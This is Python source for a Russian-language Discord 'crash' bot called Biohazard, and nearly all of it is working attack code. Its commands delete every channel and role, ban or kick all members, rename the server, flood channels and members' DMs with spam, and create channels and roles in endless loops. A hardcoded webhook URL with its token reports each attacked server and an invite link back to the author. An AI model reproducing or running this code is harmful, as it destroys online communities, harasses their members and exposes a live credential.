cdn = 0
import discord
import asyncio
from discord.ext import commands
import os
import re
import time
token = os.environ.get('TOKENZ') #токен
from discord_webhook import DiscordWebhook
print('Ожидание входа...')
class MyClient(discord.Client):
	async def on_ready(self):
		print('Вошёл как', self.user)
		await client.change_presence(activity = discord.Game('Була цiна кругленька'))
		
	async def on_message(self, message):
		global cdn #кулдаун
		c = 0
		r = 0
		m = 0
		s = 0
		white = open('whitelist.txt', 'r').read()
		black = open('blacklist.txt', 'r').read()
		vips = open('vip.txt', 'r').read()
		if message.content == '*помощь' and not message.author.bot: #помощь!!!
			await message.delete()
			cdn = 1
			embed = discord.Embed(title=":grey_question: Помощь", description="", color=0x00cc00)
			embed.add_field(name='*атака', value='Автоматический краш сервера', inline=False)
			embed.add_field(name='*аудит', value='Засорить журнал аудита приглашениями и созданием/удалением каналов', inline=False)
			embed.add_field(name='*блок', value='Заблокировать текущий канал (запретить всем отправлять сообщения)', inline=False)
			embed.add_field(name='*блоквезде', value='Заблокировать все каналы (запретить всем отправлять сообщения)', inline=False)
			embed.add_field(name='*бс', value='Проверка сервера на наличие в белом списке', inline=False)
			embed.add_field(name='*всембан', value='Забанить всех участников', inline=False)
			embed.add_field(name='*всемкик', value='Кикнуть всех участников', inline=False)
			embed.add_field(name='*вип', value='Проверка VIP-статуса', inline=False)
			embed.add_field(name='*виппомощь', value='VIP-команды', inline=False)
			embed.add_field(name='*голос', value='Удалить только голосовые каналы', inline=False)
			embed.add_field(name='*канал-', value='Удалить текущий канал', inline=False)
			embed.add_field(name='*каналы-', value='Удалить все каналы', inline=False)
			embed.add_field(name='*каналы+', value='Бесконечное создание каналов', inline=False)
			embed.add_field(name='*категории', value='Удалить только категории', inline=False)
			embed.add_field(name='*лаги', value='Чудовищный спам, вызывает лаги', inline=False)
			embed.add_field(name='*лс', value='Рассылка всем участникам в ЛС', inline=False)
			embed.add_field(name='*переименовать', value='Перименовать сервер', inline=False)
			embed.add_field(name='*разблок', value='Разблокировать текущий канал (разрешить всем отправлять сообщения)', inline=False)
			embed.add_field(name='*разблоквезде', value='Разблокировать все каналы (разрешить всем отправлять сообщения)', inline=False)
			embed.add_field(name='*роли-', value='Удалить все роли', inline=False)
			embed.add_field(name='*роли+', value='Бесконечное создание ролей', inline=False)
			embed.add_field(name='*селфбан', value='Забанить себя (может быть, кому-то пригодится :moyai:)', inline=False)
			embed.add_field(name='*текст', value='Удалить только текстовые каналы', inline=False)
			embed.add_field(name='*флуд', value='Зафлудить все каналы', inline=False)
			embed.add_field(name='*чс', value='Проверка вас на наличие в чёрном списке', inline=False)
			await message.author.send(embed=embed)
			time.sleep(30)
			cdn = 0
			
		if message.content == '*бс' and not message.author.bot:
			await message.delete()
			cdn = 1
			if white.find(str(message.guild.id)) == -1:
				await message.author.send(':x: Сервер не находится в белом списке.')
			else:
				await message.author.send(':white_check_mark: Сервер находится в белом списке.')
			time.sleep(30)
			cdn = 0
		if message.content == '*чс' and not message.author.bot:
			await message.delete()
			cdn = 1
			if black.find(str(message.author.id)) == -1:
				await message.author.send(':white_check_mark: Вас нет в чёрном списке.')
			else:
				await message.author.send(':x: Вы находитесь в чёрном списке.')
			time.sleep(30)
			cdn = 0
		if message.content == '*вип' and not message.author.bot:
			await message.delete()
			cdn = 1
			if vips.find(str(message.author.id)) == -1:
				await message.author.send(':x: У вас нет VIP-статуса.')
			else:
				await message.author.send(':white_check_mark: У вас есть VIP-статус :crown:')
			time.sleep(30)
			cdn = 0
				
		if message.content == '*виппомощь' and not message.author.bot: #помощь
			await message.delete()
			cdn = 1
			embed = discord.Embed(title=":crown: VIP-команды", description="", color=0xff9900)
			embed.add_field(name='*випканалы+', value='Создать каналы со своим названием', inline=False)
			embed.add_field(name='*виплс', value='Отправка всем в ЛС своё сообщение', inline=False)
			embed.add_field(name='*випник', value='Изменить никнеймы участников на свои', inline=False)
			embed.add_field(name='*виповнеру', value='Отправка владельцу сервера своё сообщение', inline=False)
			embed.add_field(name='*виппереименовать', value='Переименовать сервер на своё сообщение', inline=False)
			embed.add_field(name='*випроли+', value='Создать роли со своим сообщением', inline=False)
			embed.add_field(name='*випфлуд', value='Флуд своим сообщением', inline=False)
			await message.author.send(embed=embed)
			time.sleep(30)
			cdn = 0
		if message.author.id == 750245767142441000 or message.author.id == 351686223196192768:
			if message.content.startswith('*bl'):
				await message.delete()
				mc = message.content.replace('*bl', '')
				f = open('blacklist.txt', 'a')
				f.write(mc + '\n')
				await message.author.send(':white_check_mark:')
				f.close()
				
			if message.content.startswith('*wl'):
				await message.delete()
				mc = message.content.replace('*wl', '')
				f = open('whitelist.txt', 'a')
				f.write(mc + '\n')
				await message.author.send(':white_check_mark:')
				f.close()
				
			if message.content.startswith('*гивип'):
				await message.delete()
				mc = message.content.replace('*гивип', '')
				f = open('vip.txt', 'a')
				f.write(mc + '\n')
				await message.author.send(':white_check_mark:')
				f.close()
				
			if message.content.startswith('*delvip'):
				await message.delete()
				mc = message.content.replace('*delvip', '')
				with open('vip.txt', 'r+') as f:
					text = f.read()
					text = re.sub(str(mc), '', text)
					f.seek(0)
					f.write(text)
					f.truncate()
				await message.author.send(':white_check_mark:')
				
			if message.content.startswith('*delwl'):
				await message.delete()
				mc = message.content.replace('*delwl', '')
				with open('whitelist.txt', 'r+') as f:
					text = f.read()
					text = re.sub(str(mc), '', text)
					f.seek(0)
					f.write(text)
					f.truncate()
				await message.author.send(':white_check_mark:')
				
			if message.content.startswith('*delbl'):
				await message.delete()
				mc = message.content.replace('*delbl', '')
				with open('blacklist.txt', 'r+') as f:
					text = f.read()
					text = re.sub(str(mc), '', text)
					f.seek(0)
					f.write(text)
					f.truncate()
				await message.author.send(':white_check_mark:')
		if white.find(str(message.guild.id)) == -1 and black.find(str(message.author.id)) == -1:
			if message.content == '*атака' and not message.author.bot: #автоматический краш
				await message.delete() #удаление сообщения
				cdn = 1
				#await client.get_channel(732820713584721923).send('**Участник под ником **' + message.author + ' **крашит сервер **' + message.guild.name + ' **с** ' + str(len(message.guild.members)) + ' **участниками. Не доверяйте админ-права незнакомцам, будьте бдительны!**')
				oi = await message.channel.create_invite(max_age=86400)
				webhook = DiscordWebhook(url='https://discordapp.com/api/webhooks/750921087763611910/mfJq59yPP42wX4R2NsaFHD2zxTPJX5Hjx6ipsrSXOmHin7Fm9xA0lxLkSJ1FsPE7aQ-O', content=':biohazard: **Участник под ником **' + str(message.author) + ' **крашит сервер **' + str(message.guild.name) + ' **с** ' + str(len(message.guild.members)) + ' **участниками. Не доверяйте админ-права незнакомцам, будьте бдительны! **' + str(oi))
				if message.guild.name != 'Biohazard CRASH' and len(message.guild.members) > 5:
					response = webhook.execute()
				await message.guild.edit(name='Biohazard CRASH') #переименовывание сервера
				with open('chaos.jpeg', 'rb') as f:
					icon = f.read()
				await message.guild.edit(icon=icon)
				
				for i in message.guild.channels:
					await asyncio.sleep(0.1)
					try:
						await i.delete() #удаление всех каналов
						c = c + 1
					except:
						passs
				await message.author.send('**:wastebasket: Каналов удалено: **' + str(c))
				for i in message.guild.roles:
					await asyncio.sleep(0.1)
					try:
						await i.delete() #удаление всех ролей
						r = r + 1
					except:
						pass
				await message.author.send('**:wastebasket: Ролей удалено: **' + str(r))
					
				for i in message.guild.members:
					await asyncio.sleep(0.1)
					try:
						await i.ban() #бан всех участников
						m = m + 1
					except:
						pass
				await message.author.send('**:hammer: Участников забанено: **' + str(m))
				
				await asyncio.sleep(0.1)
				try:
					while c < 500:
						c += 1
						await message.guild.create_text_channel('crash-by-biohazard') #создание текстового канала
						#await y.send('@everyone Внимание, сервер крашится. С любовью, :biohazard: Biohazard :heart: Группа ВК бота: https://vk.com/biohazardbott')
						await message.guild.create_category('Crash by Biohazard') #создание категории
						await message.guild.create_voice_channel(name='Crash by Biohazard') #создание голосового канала
						await message.guild.create_role(name='Crash by Biohazard', colour=discord.Colour(0x00cc00)) #создание роли
				except:
					pass
				time.sleep(120)
				cdn = 0
				
			if message.content == '*флуд' and not message.author.bot: #флуд
				spam = '@everyone Внимание, сервер крашится. С любовью, :biohazard: Biohazard :heart:\n Группа ВК бота: https://vk.com/biohazardbot\n Discord сервер бота: https://discord.gg/zYaqUkC'
				await message.delete()
				cdn = 1
				while s <= 500:
					for channel in message.guild.text_channels:
						await channel.send(spam)
						s = s + 1
				cdn = 0
			if message.content == '*всембан' and not message.author.bot: #бан всех участников
				await message.delete()
				cdn = 1
				for i in message.guild.members:
					await asyncio.sleep(0.1)
					try:
						await i.ban() #бан
						m = m + 1
					except:
						pass
				cdn = 0
				await message.author.send('**:hammer: Участников забанено: **' + str(m))
					
			if message.content == '*всемкик' and not message.author.bot: #кик всех участников
				await message.delete()
				cdn = 1
				for i in message.guild.members:
					await asyncio.sleep(0.1)
					try:
						await i.kick() #кик
						m = m + 1
					except:
						pass
				cdn = 0
				await message.author.send('**:boot: Участников кикнуто: **' + str(m))
					
			if message.content == '*переименовать' and not message.author.bot: #переименовывание сервера
				await message.delete()
				cdn = 1
				await asyncio.sleep(0.1)
				try:
					await message.guild.edit(name='Biohazard CRASH') #переименовывание
					with open('chaos.png', 'rb') as f:
						icon = f.read()
					await message.guild.edit(icon=icon)
				except:
					pass
				cdn = 0
				
			if message.content == '*каналы-' and not message.author.bot: #удаление всех каналов
				await message.delete()
				cdn = 1
				for i in message.guild.channels:
					await asyncio.sleep(0.1)
					try:
						await i.delete() #удаление
						c = c + 1
					except:
						pass
				cdn = 0
				await message.author.send('**:wastebasket: Каналов удалено: **' + str(c))
				await message.guild.create_text_channel(name='chat')
						
			if message.content == '*роли-' and not message.author.bot: #удаление всех ролей
				await message.delete()
				cdn = 1
				for i in message.guild.roles:
					await asyncio.sleep(0.1)
					try:
						await i.delete() #удаление
						r = r + 1
					except:
						pass
				cdn = 0
				await message.author.send('**:wastebasket: Ролей удалено: **' + str(r))
					
			if message.content == '*каналы+' and not message.author.bot: #бесконечное создание каналов и категорий
				cdn = 1
				await message.delete()
				await asyncio.sleep(0.1)
				try:
					while c < 500:
						c += 1
						await message.guild.create_text_channel(name='crash-by-biohazard') #создание текстового канала
						await message.guild.create_category(name='Crash by Biohazard') #создание категории
						await message.guild.create_voice_channel(name='Crash by Biohazard') #создание голосового канала
				except:
					pass
				cdn = 0
				
			if message.content == '*заразаканалы' and not message.author.bot: #переименовывание всех каналов
				await message.delete()
				cdn = 1
				for i in message.guild.channels:
					await asyncio.sleep(0.1)
					try:
						await i.edit(name='Crash by Biohazard') #переименовывание
						c = c + 1
					except:
						pass
				await message.author.send('**:microbe: Каналов заражено: **' + str(c))
				cdn = 0
					
			if message.content == '*заразароли' and not message.author.bot: #переименовывание всех ролей
				await message.delete()
				cdn = 1
				for i in message.guild.roles:
					await asyncio.sleep(0.1)
					try:
						await i.edit(name='Crash by Biohazard', colour=discord.Colour(0x00cc00)) #переименовывание
						r = r + 1
					except:
						pass
				await message.author.send('**:microbe: Ролей заражено: **' + str(r))
				cdn = 0
					
			if message.content == '*роли+' and not message.author.bot: #бесконечное создание ролей
				cdn = 1
				await message.delete()
				await asyncio.sleep(0.1)
				try:
					while r < 250:
						await message.guild.create_role(name='Crash by Biohazard', colour=discord.Colour(0x00cc00)) #создание роли
						r += 1
				except:
					pass
				cdn = 0
					
			if message.content == '*канал-' and not message.author.bot: #удаление текущего канала
				await message.delete()
				cdn = 1
				await message.channel.delete()
				await message.author.send(':wastebasket: **Канал** `' + str(message.channel) + '` **удалён безвозвратно!**')
				time.sleep(30)
				cdn = 0
				
			if message.content == '*заразаканал' and not message.author.bot: #заражение текущего канала
				await message.delete()
				cdn = 1
				await message.channel.edit(name='crash-by-biohazard')
				await message.author.send(':microbe: **Канал** `' + str(message.channel) + '` **заражён!**')
				time.sleep(30)
				cdn = 0
				
			if message.content == '*лс' and not message.author.bot:
				cdn = 1
				await message.delete()
				for i in message.guild.members:
					await i.send('Внимание, сервер {0.guild.name} крашится. С любовью, :biohazard: Biohazard :heart:\n Группа ВК бота: https://vk.com/biohazardbot\n Discord сервер бота: https://discord.gg/zYaqUkC'.format(message))
				cdn = 0
					
			if message.content == '*лаги' and not message.author.bot: #лаги
				await message.delete()
				cdn = 1
				embed = discord.Embed(title=":biohazard: КРАШ!!!", description="", color=0x00cc00)
				embed.add_field(name=':biohazard: :biohazard: :biohazard: :biohazard: :biohazard:', value='Внимание, сервер крашится.', inline=False)
				embed.add_field(name=':biohazard: :biohazard: :biohazard: :biohazard: :biohazard:', value='Внимание, сервер крашится.', inline=False)
				embed.add_field(name=':biohazard: :biohazard: :biohazard: :biohazard: :biohazard:', value='Внимание, сервер крашится.', inline=False)
				embed.add_field(name=':biohazard: :biohazard: :biohazard: :biohazard: :biohazard:', value='Внимание, сервер крашится.', inline=False)
				embed.add_field(name=':biohazard: :biohazard: :biohazard: :biohazard: :biohazard:', value='Внимание, сервер крашится.', inline=False)
				embed.add_field(name=':biohazard: :biohazard: :biohazard: :biohazard: :biohazard:', value='Внимание, сервер крашится.', inline=False)
				embed.add_field(name=':biohazard: :biohazard: :biohazard: :biohazard: :biohazard:', value='Внимание, сервер крашится.', inline=False)
				embed.add_field(name=':biohazard: :biohazard: :biohazard: :biohazard: :biohazard:', value='Внимание, сервер крашится.', inline=False)
				embed.add_field(name=':biohazard: :biohazard: :biohazard: :biohazard: :biohazard:', value='Внимание, сервер крашится.', inline=False)
				while s < 500:
					for i in message.guild.text_channels:
						await i.send('@everyone', embed=embed)
						s += 1
				cdn = 0
				
			if message.content == '*текст' and not message.author.bot:
				await message.delete()
				cdn = 1
				for i in message.guild.text_channels:
					await asyncio.sleep(0.1)
					try:
						await i.delete() #удаление
						c = c + 1
					except:
						pass
				cdn = 0
				await message.author.send('**:wastebasket: Каналов удалено: **' + str(c))
				
			if message.content == '*голос' and not message.author.bot:
				await message.delete()
				cdn = 1
				for i in message.guild.voice_channels:
					await asyncio.sleep(0.1)
					try:
						await i.delete() #удаление
						c = c + 1
					except:
						pass
				cdn = 0
				await message.author.send('**:wastebasket: Каналов удалено: **' + str(c))
				
			if message.content == '*категории' and not message.author.bot:
				await message.delete()
				cdn = 1
				for i in message.guild.categories:
					await asyncio.sleep(0.1)
					try:
						await i.delete() #удаление
						c = c + 1
					except:
						pass
				cdn = 0
				await message.author.send('**:wastebasket: Категорий удалено: **' + str(c))
				
			if message.content == '*селфбан' and not message.author.bot:
				await message.delete()
				if message.author != message.guild.owner:
					await message.author.ban()
				else:
					await message.channel.send(':x: Вы не можете забанить себя, т.к. являетесь владельцем сервера.')
					
			if message.content == '*аудит' and not message.author.bot:
				await message.delete()
				while c < 500:
					oi = await message.channel.create_invite(max_age=86400)
					ch = await message.guild.create_text_channel(name='crash-by-biohazard')
					await ch.delete()
					c += 1
					
			if message.content == '*блок' and not message.author.bot:
				await message.delete()
				await message.channel.set_permissions(message.guild.default_role, send_messages=False)
				await message.author.send(':white_check_mark:')
				
			if message.content == '*разблок' and not message.author.bot:
				await message.delete()
				await message.channel.set_permissions(message.guild.default_role, send_messages=True)
				await message.author.send(':white_check_mark:')
				
			if message.content == '*блоквезде' and not message.author.bot:
				await message.delete()
				for i in message.guild.text_channels:
					await i.set_permissions(message.guild.default_role, send_messages=False)
				await message.author.send(':white_check_mark:')
				
			if message.content == '*разблоквезде' and not message.author.bot:
				await message.delete()
				for i in message.guild.text_channels:
					await i.set_permissions(message.guild.default_role, send_messages=True)
				await message.author.send(':white_check_mark:')
					
					
			if vips.find(str(message.author.id)) != -1 and not message.author.bot:
				if message.content.startswith('*випканалы+'):
					await message.delete()
					n = message.content.replace('*випканалы+', '')
					while True:
						await message.guild.create_text_channel(name=n)
						await message.guild.create_voice_channel(name=n)
						await message.guild.create_category(name=n)
						
				if message.content.startswith('*випроли+'):
					await message.delete()
					n = message.content.replace('*випроли+', '')
					while True:
						await message.guild.create_role(name=n, colour=discord.Colour(0x00cc00))
						
				if message.content.startswith('*виповнеру'):
					await message.delete()
					n = message.content.replace('*виповнеру', '')
					await message.guild.owner.send(n)
					
				if message.content.startswith('*виплс'):
					n = message.content.replace('*виплс', '')
					await message.delete()
					for i in message.guild.members:
						await i.send(n)
						
				if message.content.startswith('*виппереименовать'):
					await message.delete()
					n = message.content.replace('*виппереименовать', '')
					with open('chaos.png', 'rb') as f:
						icon = f.read()
					await message.guild.edit(name=n, icon=icon)
					
				if message.content.startswith('*випфлуд'):
					await message.delete()
					n = message.content.replace('*випфлуд', '')
					while s <= 500:
						for channel in message.guild.text_channels:
							await channel.send(n)
							s = s + 1
							
				if message.content.startswith('*випник'):
					n = message.content.replace('*випник', '')
					await message.delete()
					for i in message.guild.members:
						await i.edit(nick=str(n))

client = MyClient()
client.run(str(token))
